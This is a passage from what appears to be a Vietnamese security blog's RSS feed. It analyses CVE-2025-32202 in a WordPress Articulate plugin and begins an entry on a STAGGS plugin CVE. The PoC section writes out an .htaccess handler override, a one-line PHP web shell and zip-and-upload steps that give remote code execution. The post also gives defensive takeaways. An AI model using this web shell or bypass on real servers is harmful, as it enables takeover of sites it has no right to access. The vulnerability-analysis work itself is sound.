is_dir( $dir ) ) {&#xA;&#xA;        $dir_handle = opendir( $dir );&#xA;        if ( $dir_handle ) {&#xA;            while ( $file = readdir( $dir_handle ) ) {&#xA;                if ( $file != &amp;#39;.&amp;#39; &amp;amp;&amp;amp; $file != &amp;#39;..&amp;#39; ) {&#xA;                    if ( !is_dir( $dir . &amp;#39;/&amp;#39; . $file ) &amp;amp;&amp;amp;&#xA;                        (strpos($file, &amp;#39;.phtml&amp;#39;) !== false ||&#xA;                         strpos($file, &amp;#39;.php&amp;#39;) !== false &amp;amp;&amp;amp; $file != &amp;#39;relay.php&amp;#39; ||&#xA;                         strpos($file, &amp;#39;.phar&amp;#39;) !== false) ) { // Added condition for .phar files&#xA;                        return true;&#xA;                    } else {&#xA;                        $found = articulate_has_php_file( $dir . &amp;#39;/&amp;#39; . $file );&#xA;                        if ( $found ) {&#xA;                            return true;&#xA;                        }&#xA;                    }&#xA;                }&#xA;            }&#xA;            closedir( $dir_handle );&#xA;        }&#xA;&#xA;        return false;&#xA;    }&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Ngo√†i &lt;code&gt;.phtml&lt;/code&gt;, &lt;code&gt;.php&lt;/code&gt;, &lt;code&gt;.phar&lt;/code&gt; ta c√≥ th·ªÉ d√πng &lt;code&gt;.htaccess&lt;/code&gt; nh·∫±m ghi ƒë√® c∆° ch·∫ø x·ª≠ l√Ω trong th∆∞ m·ª•c upload; k·∫øt qu·∫£ l√† c√°c file upload sau ƒë√≥ v·ªõi ph·∫ßn m·ªü r·ªông do attacker ƒë·∫∑t (v√≠ d·ª• &lt;code&gt;.abc&lt;/code&gt;, &lt;code&gt;.xnxx&lt;/code&gt;) c√≥ th·ªÉ th·ª±c thi nh∆∞ file PHP.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;IfModule mod_php.c&amp;gt;&#xA;   &amp;lt;Files &amp;#34;*.abc&amp;#34;&amp;gt;&#xA;       SetHandler application/x-httpd-php&#xA;   &amp;lt;/Files&amp;gt;&#xA;&amp;lt;/IfModule&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;N·∫øu c√≥ file nguy hi·ªÉm:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$arr[0] = &amp;#39;&amp;lt;span style=&amp;#34;color:red&amp;#34;&amp;gt;ZIP upload successful, but we found a PHP file...&amp;lt;/span&amp;gt;&amp;#39;;&#xA;articulate_rrmdir( $target ); // X√≥a to√†n b·ªô th∆∞ m·ª•c&#xA;$arr[4] = 0;&#xA;$arr[1] = &amp;#39;&amp;#39;;&#xA;$arr[2] = $dir;&#xA;$arr[3] = &amp;#39;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;B√°o l·ªói cho ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;li&gt;G·ªçi &lt;code&gt;articulate_rrmdir()&lt;/code&gt; ƒë·ªÉ &lt;strong&gt;x√≥a to√†n b·ªô th∆∞ m·ª•c ƒë√£ gi·∫£i n√©n&lt;/strong&gt; (ƒë·ªÅ ph√≤ng file ƒë·ªôc).&lt;/li&gt;&#xA;&lt;li&gt;ƒê·∫∑t &lt;code&gt;OK = 0&lt;/code&gt; (th·∫•t b·∫°i).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;N·∫øu KH√îNG c√≥ file PHP nguy hi·ªÉm:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$file = getFile( $target, true ); // L·∫•y th√¥ng tin file ch√≠nh (HTML)&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;H√†m &lt;code&gt;getFile()&lt;/code&gt; t√¨m file HTML ch√≠nh (ƒëi·ªÉm b·∫Øt ƒë·∫ßu c·ªßa n·ªôi dung Articulate).&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra tr·∫°ng th√°i c·ªßa file HTML t√¨m th·∫•y.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( $file[&amp;#39;status&amp;#39;] == &amp;#39;valid_html_file_found&amp;#39; || ...) {&#xA;    $arr[4] = 1; // OK = 1&#xA;} elseif ( $file[&amp;#39;status&amp;#39;] == &amp;#39;no_html_file_found&amp;#39; ) {&#xA;    articulate_rrmdir( $target ); // X√≥a th∆∞ m·ª•c n·∫øu kh√¥ng c√≥ file HTML&#xA;    $arr[4] = 0;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Tr·∫£ v·ªÅ th√¥ng tin k·∫øt qu·∫£&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$arr[1] = getUploadsUrl() . $dir . &amp;#39;/&amp;#39; . $file[&amp;#39;file_name&amp;#39;];&#xA;$arr[2] = $dir;&#xA;$arr[3] = $file;&#xA;return $arr;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;$arr&lt;/code&gt; ch·ª©a th√¥ng tin nh∆∞:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[0]&lt;/code&gt;: th√¥ng ƒëi·ªáp&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[1]&lt;/code&gt;: URL file&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[2]&lt;/code&gt;: th∆∞ m·ª•c&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[3]&lt;/code&gt;: th√¥ng tin chi ti·∫øt file&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;$arr[4]&lt;/code&gt;: tr·∫°ng th√°i th√†nh c√¥ng/th·∫•t b·∫°i (OK)&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;POST /wp-admin/admin-ajax.php?action=articulate_upload_file&amp;#34;] --&amp;gt; B[&amp;#34;articulate_upload_ajax_file()&amp;#34;]&#xA;B --&amp;gt; C{&amp;#34;check_ajax_referer(&amp;#39;articulate_upload_file&amp;#39;) valid?&amp;#34;}&#xA;C -- No --&amp;gt; Z[&amp;#34;Return JSON error&amp;#34;]&#xA;C -- Yes --&amp;gt; D{&amp;#34;User has &amp;#39;upload_files&amp;#39; &amp;amp;&amp;amp; &amp;#39;unfiltered_html&amp;#39;?&amp;#34;}&#xA;D -- No --&amp;gt; Z&#xA;D -- Yes --&amp;gt; E[&amp;#34;Handle uploaded file ‚Üí save to {$filePath}.part&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Combine chunks &amp;amp; rename ‚Üí articulate_custom_rename(&amp;#39;{$filePath}.part&amp;#39;, $filePath)&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;extractZip($filePath, $target, $dir)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Quiz_Unzip-&amp;gt;unzip_file($filePath, $target)&amp;#34;]&#xA;H --&amp;gt; I{&amp;#34;articulate_has_php_file($target) detect .php/.phtml/.phar ?&amp;#34;}&#xA;I -- Yes --&amp;gt; J[&amp;#34;articulate_rrmdir($target) ‚Üí delete folder ‚Üí return error&amp;#34;]&#xA;I -- No --&amp;gt; K[&amp;#34;(‚ùå Missing check for .htaccess file)&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Attacker uploads ZIP containing .htaccess&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;.htaccess overrides Apache handler in upload dir&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;‚Üí Arbitrary File Upload ‚Üí Remote Code Execution (RCE)&amp;#34;]&#xA;&#xA;%% Patch branch&#xA;K --&amp;gt; P[&amp;#34;‚úÖ [Patched] articulate_has_php_file() adds &amp;#39;.htaccess&amp;#39; check&amp;#34;]&#xA;P --&amp;gt; Q[&amp;#34;Upload blocked if .htaccess detected&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o c·∫•u tr√∫c th∆∞ m·ª•c sau:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;bypass&#xA;.&#xA;‚îú‚îÄ‚îÄ .htaccess&#xA;‚îú‚îÄ‚îÄ index.html&#xA;‚îî‚îÄ‚îÄ rce.abc&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;.htaccess&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;IfModule mod_php.c&amp;gt;&#xA;    &amp;lt;Files &amp;#34;*.abc&amp;#34;&amp;gt;&#xA;        SetHandler application/x-httpd-php&#xA;    &amp;lt;/Files&amp;gt;&#xA;&amp;lt;/IfModule&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;T·∫°o rule, c√≥ th·ªÉ upload file &lt;code&gt;.abc&lt;/code&gt; trong th∆∞ m·ª•c hi·ªán t·∫°i v√† th∆∞ m·ª•c con. Khi·∫øn n√≥ th·ª±c thi nh∆∞ file &lt;code&gt;.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;rce.abc&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Ch·ª©a web shell&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system($_REQUEST[&amp;#34;cmd&amp;#34;]) ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;N√©n th∆∞ m·ª•c l·∫°i th√†nh file &lt;code&gt;.zip&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;zip -r bypass.zip bypass&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Upload file zip v·ª´a t·∫°o&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/widget.png&#34; title=&#34;Widget c·ªßa plugin trong t·∫°o post&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/widget.png&#34; data-sub-html=&#34;&lt;h2&gt;e-Elearning&lt;/h2&gt;&lt;p&gt;Widget c·ªßa plugin trong t·∫°o post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/widget.png&#39; alt=&#34;e-Elearning&#34; height=&#34;542&#34; width=&#34;1401&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Widget c·ªßa plugin trong t·∫°o post&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;ƒê√¢y l√† ch·ª©c nƒÉng ƒë∆∞·ª£c m√¥t t·∫£ trong document c·ªßa plugin, ta t·∫°o post r·ªìi th√™m widget n√†y sau ƒë√≥ th·ª±c hi·ªán upload zip file&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/block.png&#34; title=&#34;Widget e-Elearning&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/block.png&#34; data-sub-html=&#34;&lt;h2&gt;Block&lt;/h2&gt;&lt;p&gt;Widget e-Elearning&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/block.png&#39; alt=&#34;Block&#34; height=&#34;189&#34; width=&#34;348&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Widget e-Elearning&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Request v√† Response trong BurpSuite:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/re_rs.png&#34; title=&#34;Request v√† Response trong BurpSuite&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/re_rs.png&#34; data-sub-html=&#34;&lt;h2&gt;Request v√† Response trong BurpSuite&lt;/h2&gt;&lt;p&gt;Request v√† Response trong BurpSuite&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/re_rs.png&#39; alt=&#34;Request v√† Response trong BurpSuite&#34; height=&#34;580&#34; width=&#34;1895&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request v√† Response trong BurpSuite&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;RCE v·ªõi web shell&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-12-cve-2025-32202/result.png&#34; title=&#34;RCE v·ªõi file upload&#34; data-thumbnail=&#34;/posts/2025-11-12-cve-2025-32202/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE v·ªõi file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-12-cve-2025-32202/result.png&#39; alt=&#34;Result&#34; height=&#34;580&#34; width=&#34;1305&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE v·ªõi file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-32202&lt;/strong&gt; ph√°t sinh do plugin &lt;strong&gt;Insert or Embed Articulate Content into WordPress&lt;/strong&gt; ki·ªÉm tra kh√¥ng ƒë·∫ßy ƒë·ªß lo·∫°i file ƒë∆∞·ª£c gi·∫£i n√©n, b·ªè s√≥t tr∆∞·ªùng h·ª£p &lt;code&gt;.htaccess&lt;/code&gt;. ƒêi·ªÅu n√†y cho ph√©p attacker c√≥ quy·ªÅn &lt;strong&gt;Editor&lt;/strong&gt; t·∫£i l√™n m·ªôt file &lt;code&gt;.htaccess&lt;/code&gt; ƒë·ªÉ ghi ƒë√® c∆° ch·∫ø x·ª≠ l√Ω file trong th∆∞ m·ª•c upload. K·∫øt qu·∫£ l√† c√°c file ƒë∆∞·ª£c t·∫£i l√™n sau ƒë√≥, d√π c√≥ ph·∫ßn m·ªü r·ªông t√πy √Ω (nh∆∞ &lt;code&gt;.abc&lt;/code&gt;, &lt;code&gt;.xyz&lt;/code&gt;), v·∫´n c√≥ th·ªÉ ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ file PHP, d·∫´n ƒë·∫øn &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&#xA;B·∫£n v√° &lt;strong&gt;4.3000000026&lt;/strong&gt; ƒë√£ b·ªï sung ki·ªÉm tra ƒë·ªëi v·ªõi &lt;code&gt;.htaccess&lt;/code&gt;, ngƒÉn ch·∫∑n vi·ªác ghi ƒë√® handler trong th∆∞ m·ª•c upload v√† lo·∫°i b·ªè kh·∫£ nƒÉng khai th√°c n√†y.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;C·∫ßn ki·ªÉm tra ch·∫∑t ch·∫Ω m·ªçi lo·∫°i file c√≥ th·ªÉ ·∫£nh h∆∞·ªüng ƒë·∫øn h√†nh vi m√°y ch·ªß, ƒë·∫∑c bi·ªát l√† &lt;code&gt;.htaccess&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng ch·ªâ d·ª±a v√†o ph·∫ßn m·ªü r·ªông file; c·∫ßn x√°c th·ª±c c·∫£ MIME type v√† n·ªôi dung th·ª±c t·∫ø c·ªßa file.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng n√™n cho ph√©p ng∆∞·ªùi d√πng, k·ªÉ c·∫£ t√†i kho·∫£n c√≥ quy·ªÅn Editor, t·∫£i l√™n file n√©n ch·ª©a n·ªôi dung c√≥ th·ªÉ th·ª±c thi.&lt;/li&gt;&#xA;&lt;li&gt;C·∫ßn t√°ch bi·ªát r√µ r√†ng th∆∞ m·ª•c upload c·ªßa ng∆∞·ªùi d√πng kh·ªèi th∆∞ m·ª•c c√≥ th·ªÉ th·ª±c thi PHP.&lt;/li&gt;&#xA;&lt;li&gt;Th∆∞·ªùng xuy√™n ki·ªÉm tra v√† c·∫≠p nh·∫≠t plugin; c√°c l·ªói nh·ªè trong c∆° ch·∫ø l·ªçc file c√≥ th·ªÉ d·∫´n t·ªõi RCE nghi√™m tr·ªçng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/insert-or-embed-articulate-content-into-wordpress/vulnerability/wordpress-insert-or-embed-articulate-content-into-wordpress-plugin-4-3000000025-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Insert or Embed Articulate Content into WordPress Plugin &amp;lt;= 4.3000000025 is vulnerable to Arbitrary File Upload &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-47637 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/</link>
      <pubDate>Tue, 11 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-11-cve-2025-47637/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Arbitrary File Upload&lt;/strong&gt; trong plugin &lt;strong&gt;STAGGS&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng t·∫£i l√™n &lt;strong&gt;Web Shell&lt;/strong&gt; l√™n m√°y ch·ªß web, ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c phi√™n b·∫£n &lt;strong&gt;STAGGS t·ª´ n/a ƒë·∫øn 2.11.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-47637&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-47637&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.11.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.12.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required 